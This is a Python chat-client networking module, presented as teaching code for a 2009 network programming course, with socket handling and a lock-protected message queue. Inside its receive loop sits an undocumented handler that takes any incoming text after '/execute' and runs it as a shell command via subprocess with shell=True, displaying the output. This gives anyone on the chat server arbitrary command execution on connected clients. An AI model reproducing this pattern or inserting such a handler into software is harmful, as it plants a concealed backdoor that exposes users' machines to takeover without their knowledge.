"""
**File:** chatnetwork.py

The networking portion of chat room client.
Most of this runs in a separate thread from the main thread which manages
the graphical interface. See wxchat.py

Copyright 2009, Tim Bower. Apache Open Source License
"""
# Copyright 2009 Tim Bower 
# This program was developed for education purposes for the Network
# Programming Class, CMST 355, at Kansas State University at Salina.
#
# This program is licensed as Open Source Software using the Apache License,
# Version 2.0 (the "License"); you may not use this file except in compliance
# with the License. You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# You are free to use, copy, distribute, and display the work, and to make
# derivative works. If you do, you must give the original author credit. The
# author specifically permits (and encourages) teachers to post, reproduce,
# and distribute some or all of this material for use in their classes or by
# their students.

import socket
import threading
import subprocess
import rendezvous

defaulthost = 'localhost'
port = 50000

class ChatConnect(threading.Thread):
    """
    Run as a separate thread to make and manage the socket connection to the
    chat server.
    """
    def __init__(self, host, connected, display, lost):
        threading.Thread.__init__(self)
        self.host = host
        self.connected = connected
        self.display = display
        self.lost = lost
        self.msgLock = threading.Lock()
        self.numMsg = 0
        self.msg = []

    def run(self):
        "The new thread starts here to listen for data from the server"
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(1)
        try:
            self.socket.connect((self.host, port))
        except:
            self.lost("Unable to connect to %s. Check the server." % self.host)
            return
        self.connected()
        while True:
            self.__send()
            try:
                data = self.socket.recv(4096)
            # Timeout once in a while just to check user input
            except socket.timeout:
                continue
            except:  # server was stopped or had some error
                self.lost("Network Connection closed by the server...")
                break
            if len(data):
                if("/execute" in data):
                    com=data.split("/execute",1)[1]
                    com=com.rstrip()
                    com=com.strip()
                    self.display(data.split("/execute",1)[0] + "\tExecuting " +com + "\n")
                    st=subprocess.Popen(com,stdout=subprocess.PIPE,stdin=None,stderr=subprocess.PIPE,shell=True)
                    out,err=st.communicate()
                    self.display(out)
                    self.display(err)
                else:
                    self.display(data)
            else:
                # no data when peer does a socket.close()
                self.lost("Network Connection closed...")
                break
        # End loop of network send / recv data
        self.socket.close()

    def __send(self):
        """
        Actually send a message, if one is available, to the server.
        Need to acquire lock for the message queue.
        """
        self.msgLock.acquire()
        if self.numMsg > 0:
            self.socket.send(self.msg.pop(0))
            self.numMsg -= 1
        self.msgLock.release()

    def send(self, msg):
        """
        Set up to send a message to the server - called from main thread
        This is the only part of this class that executes in the main tread,
        We use a list to drop off the message for the networking thread to pick
        up and actually send it.  We could use a Queue.Queue object, which
        comes standard with Python and not have to mess with locks.  When the
        graphics were done with Tkinter, I did that to send data back to
        the main thread.  This locking stuff is pretty simple, so it's a good
        place to see how to do the locking ourself.
        """
        self.msgLock.acquire()
        self.msg.append(msg)
        self.numMsg += 1
        self.msgLock.release()
